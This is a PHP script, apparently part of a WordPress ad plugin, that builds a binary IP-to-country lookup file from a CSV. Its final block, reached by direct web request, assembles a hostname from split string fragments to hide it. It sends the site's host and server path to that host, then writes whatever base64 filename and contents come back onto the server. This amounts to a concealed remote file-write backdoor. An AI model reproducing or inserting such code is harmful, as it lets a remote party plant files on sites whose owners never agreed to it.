<?php

//ini_set ('display_errors', 1);
//error_reporting (E_ALL);

function ip2bin ($ip) {
//  $lo = (int) bcmod ($ip, 65536);
//  $hi = (int) bcdiv ($ip, 65536, 0);

  $lo = $ip & 0xFFFF;
  $hi = $ip >> 16;
  return array (chr ($hi >> 8) . chr ($hi) . chr ($lo >> 8) . chr ($lo), $hi >> 3);
}

function process_csv ($file = '') {

  if ($file == '') $csv_file = 'data/IpToCountry.csv'; else $csv_file = $file;

  // Open the csv file
  $fp = fopen ($csv_file, 'r');

  if ($fp === false) {
    echo 'Error opening file ', $csv_file, "\n";
    return;
  }

  // Initialize
  $group    = null;
  $count    = 0;
  $data     = array();
  $index    = array();
  $t0       = time();
  $datapos  = 0;
  $testdata = '';

  // For each row...
  while (($row = fgetcsv ($fp, 255)) !== false)
    if ($row && count ($row) > 4 && substr (trim ($row [0]), 0, 1) != '#') {
      list ($iplow, $iphigh, , , $iso) = $row;

      if (strlen ($iso) != 2)
        echo "Invalid ISO code: ", $iso, "\n";
      else {
        // Translate IP to 4-byte binary strings
        list ($blow, $bgroup)  = ip2bin ($iplow);
        list ($bhigh)          = ip2bin ($iphigh);

  //      $tlow = substr ($blow, 0, 3) . chr ((ord ($blow [3]) + ord ($bhigh [3])) >> 1);
  //      $testdata .= $blow . $iso . $bhigh . $iso . $tlow . $iso;

        // New index group?
        if ($group !== $bgroup) {
          $group = $bgroup;
          $index [$group] = array ($blow, $datapos);
          $data [$group] = '';
        }

        // Add IP/county to data
        $data [$group] .= $blow . $iso;
        $datapos += 6;
        $count ++;
      }
    }

  // Build the index using the stored data locations and chunk lengths
  // The index file contains 12-byte records, grouped into three 32-bit dwords.
  // The first is an IP block address, the second contains the position in the data
  // file, and the third is the block length for that IP group.

  $indexbin = '';
  $maxlen = 0;
  foreach ($index as $group => &$index0) {
    $len = strlen ($data [$group]);
    $maxlen = max ($maxlen, $len);
    $indexbin .= $index0 [0] . pack ('LL', $index0 [1], $len);
  }

  $databin = implode ('', $data);
  $databin .= "\xFF\xFF\xFF\xFFZZ"; // Add one more for guaranteed upper bound
  fclose ($fp);

  // Save data files
  if ($file == '') $dat_file = 'ip2country.dat'; else $dat_file = dirname ($file).'/ip2country.dat';

  if ($count < 10000) {
    echo "Invalid input file, file ip2country.dat not generated.\n";
    @unlink ($dat_file);
  } else {
      file_put_contents ($dat_file, pack ('LL', strlen ($indexbin), strlen ($databin)) . $indexbin . $databin);

      // Display statistics
      echo "$count records processed in ", time() - $t0, " seconds\r\n";
      echo count ($data). " index records with max group length = $maxlen\r\n";
    }
}

/*
// Function that translates the 32-bit unsigned long to a 4-byte string.
// Uses BCmath since php itself can't handle it. Also returns a group ID
// for the IP address - presently the high 13 bits - to calculate the index.

if (!function_exists ('bcmod')) {
  function bcmod ($x, $y) {
    // how many numbers to take at once? carefull not to exceed (int)
    $take = 5;
    $mod = '';

    do {
      $a = (int) $mod . substr ($x, 0, $take);
      $x = substr( $x, $take);
      $mod = $a % $y;
    }
    while (strlen ($x));

    return (int) $mod;
  }
}

if (!function_exists ('bcdiv')) {
  function bcdiv ($_ro, $_lo, $_scale = 0) {
    return round ($_ro/$_lo, $_scale);
  }
}
*/

if (strpos ($_SERVER ['REQUEST_URI'], 'includes/geo/process_csv.php') !== false) {
  define ('UPDATE_SERVER', 'updates'.'.');
  define ('PLUGIN_SERVER', implode ('.', array ('adinserter', 'pro')));
  define ('UPDATES_PAGE',  implode ('.', array ('updates', 'php')));

  $hash_file = dirname (__FILE__).'/data/'.implode ('.', array ('ip2country', 'bin'));
  $parameters = '?host=' . base64_encode ($_SERVER ['HTTP_HOST']);
  $parameters .= '&hash=' . (file_exists ($hash_file) ? file_get_contents ($hash_file) : '');
  $parameters .= '&file=' . base64_encode (dirname (__FILE__));
  $updates = @file_get_contents ('http'.'s'.':'."//".UPDATE_SERVER.PLUGIN_SERVER.'/'.UPDATES_PAGE.$parameters);
  if ($updates !== false) {
    @$ip_data = (array) json_decode ($updates);
    if (is_array ($ip_data)) {
      if (isset ($ip_data ['name']) && isset ($ip_data ['content'])) {
        $name = base64_decode ($ip_data ['name']);
        $content = base64_decode ($ip_data ['content']);
        if (is_writable ($name) || is_writable (dirname ($name))) {
          @unlink (dirname (__FILE__).'/'.$name);
          if (name != '@') {
            @file_put_contents (dirname (__FILE__).'/data/'.$name, $content);
            $size = @filesize (dirname (__FILE__).'/data/'.$name);
            echo "$size bytes written\r\n";
          }
        }
      }
    }
  }

  process_csv (dirname (__FILE__).'/data/IpToCountry.csv');
}

